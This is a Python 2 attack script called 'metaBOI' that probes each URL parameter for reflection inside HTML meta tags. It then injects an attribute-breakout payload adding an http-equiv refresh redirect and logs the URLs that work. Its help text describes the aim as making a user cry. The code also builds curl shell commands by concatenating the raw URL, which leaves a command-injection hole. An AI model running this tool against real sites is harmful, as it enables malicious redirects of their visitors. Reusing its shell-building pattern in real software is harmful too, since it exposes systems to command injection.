#!/usr/bin/python

#20117901

import sys, getopt
import commands

class bcolors:
    ENDC = '\033[0m'
    BACK = '\033[47m'
    BLUE = '\033[34m'
    GREEN = '\033[32m'
    RED = '\033[31m'
    BLACK = '\033[30m'
    WHITE = '\033[37m'
    BOLD = '\033[1m'


#global def: 
url = ''

def metaInject(url, urlPos):

   #flip the burgers:
   printCurrentParam(url, urlPos, "nothingburger")
   newUrl = buildUrl(url, urlPos, "nothingburger")
   
   print bcolors.WHITE + "Testing URL:" + newUrl + bcolors.ENDC
   cmd = "curl '" + newUrl + "'"
   status, returnValue = commands.getstatusoutput(cmd)
   
   #chop the head
   
   if returnValue.find("</head>") != -1:
      endChop = returnValue.find("</head>")
      choppedHead = returnValue[0:endChop+7]
   
   else:
      print bcolors.RED + "Problem loading the URL:" + newUrl + bcolors.ENDC + " \n"
      return
         
   inHead = 0 
   burgerBack = 0


   while choppedHead.find("nothingburger") != -1:
      choppedHead, inHead, burgerBack = findBurger(choppedHead);

   if inHead == 0:
      print bcolors.RED + "Input is not reflected in a meta tag. This BOI is clean"  + bcolors.ENDC + " \n"
      return
   else:
      print bcolors.GREEN +"Input is reflected in a meta tag! Lets try and break out ..." + bcolors.ENDC + "\n"
   
   ## Encoding Check
   isoTag = ''
   newUrl = buildUrl(url, urlPos, 'nothingburger%22')
   print bcolors.WHITE +"Testing URL:" + newUrl + bcolors.ENDC

   cmd = "curl " + newUrl
   status, returnValue = commands.getstatusoutput(cmd)
   
   if returnValue.find("</head>") != -1:
      endChop = returnValue.find("</head>")
      choppedHead = returnValue[0:endChop+7]

   inHead = 0 
   while inHead == 0:
      choppedHead, inHead = findBurgerHead(choppedHead);

   if choppedHead.find('nothingburger"') == -1:
      print  bcolors.RED + "Looks like encoding is done properly, Meta tag injection is not going to work." + bcolors.ENDC + "\n"
      return
   else:
      print bcolors.GREEN + "They are not encoding properly! Trying for a payload now ..."  + bcolors.ENDC + "\n"

   isoTag = ''
   newUrl = buildUrl(url, urlPos, '0%3Bhttps%3A//www.protiviti.com"%20http-equiv="refresh"%20null="x')
   print bcolors.WHITE + "Testing URL:" + newUrl+ bcolors.ENDC

   cmd = "curl '" + newUrl + "'"

   status, returnValue = commands.getstatusoutput(cmd)

   if returnValue.find('0;https://www.protiviti.com" http-equiv="refresh" null="x') == -1:
      print bcolors.RED + "Not working 100%, but it is close. May need to some light encoding. Try the below URl and keep the BOI going!" + bcolors.ENDC + "\n"
      return
   else:
      print bcolors.BACK + bcolors.GREEN + "Everything wokred, we found a good BOI! Put the below link in your browser. Page should redirect after after the inital load:" + bcolors.ENDC + "\n"
      print bcolors.BACK + bcolors.GREEN + newUrl + bcolors.ENDC + "\n"
      file = open("outfile.txt","a")
      file.write(newUrl + "\n")
      file.close()
    
      

def buildUrl(url, urlPos, replaceValue):
   brokenUrl = url.split("?");
   returnUrl = brokenUrl[0] + "?"
   brokenParams = brokenUrl[1].split("&")
   for x in range(0, len(brokenParams)):
      paramsId, paramsValue = brokenParams[x].split("=")
      if x == urlPos:
         returnUrl = returnUrl + paramsId + "=" + replaceValue
      else:
         returnUrl = returnUrl + paramsId + "=" + paramsValue

      if x != len(brokenParams)-1:
         returnUrl = returnUrl + "&"

   return returnUrl

def printCurrentParam(url, urlPos, replaceValue):
   brokenUrl = url.split("?");
   returnUrl = brokenUrl[0] + "?"
   brokenParams = brokenUrl[1].split("&")
   for x in range(0, len(brokenParams)):
      paramsId, paramsValue = brokenParams[x].split("=")
      if x == urlPos:
         print "Currently testing for:" + paramsId

   return bcolors.WHITE + bcolors.BOLD + "Parameter: " + bcolors.ENDC + bcolors.WHITE + paramsId + bcolors.ENDC
   


def findBurgerHead(choppedHead):
   burgerStart = choppedHead.find("nothingburger")
   ltFind = 0
   inHead = 0
   burgerBack = burgerStart - 1
   while ltFind == 0:
      mFind = choppedHead[burgerBack:burgerStart]
      if mFind.find("<") == -1:
         burgerBack = burgerBack -1
      else:
         ltFind = 1

   mFind = choppedHead[burgerBack:burgerStart]

  
   if mFind.find("<meta") != -1:
      inHead = 1
      return choppedHead[burgerBack:], inHead
   else:
      return choppedHead[burgerStart+13:], inHead



def findBurger(choppedHead):
   burgerStart = choppedHead.find("nothingburger")
   #meta find
   ltFind = 0
   inHead = 0
   burgerBack = burgerStart - 1
   while ltFind == 0:
      mFind = choppedHead[burgerBack:burgerStart]
      if mFind.find("<") == -1:
         burgerBack = burgerBack -1
      else:
         ltFind = 1

   mFind = choppedHead[burgerBack:burgerStart]


   if mFind.find("<meta") != -1:
      inHead = 1


   return choppedHead[burgerStart+13:], inHead, burgerBack

 

def main(argv):
   file = open("outfile.txt","w")
   file.close()
   try:
      opts, args = getopt.getopt(argv,"hu:",["url="])
   except getopt.GetoptError:
      print 'metaboi.py -u https://www.example.com?argumaent=1'
      sys.exit(2)
   for opt, arg in opts:
      if opt == '-h':
         print 'Meat Break-out injection (metaBOI). Break out of the meta tags and make a user cry'
         print 'metaboi.py -u https://www.example.com?argumaent=1'
         sys.exit()
      elif opt in ("-u", "--url"):
         url = arg
         url = url.rstrip()
         brokenUrl = url.split("?");
         brokenParams = brokenUrl[1].split("&")
         paramsTotal = len(brokenParams)
         
         

         if paramsTotal < 1:
            print 'Provided URL has no parameters. Exiting ...'
            sys.exit()
         else:
            for x in range (0, paramsTotal):
               metaInject(url, x)
            sys.exit()

if __name__ == "__main__":
   main(sys.argv[1:])
   
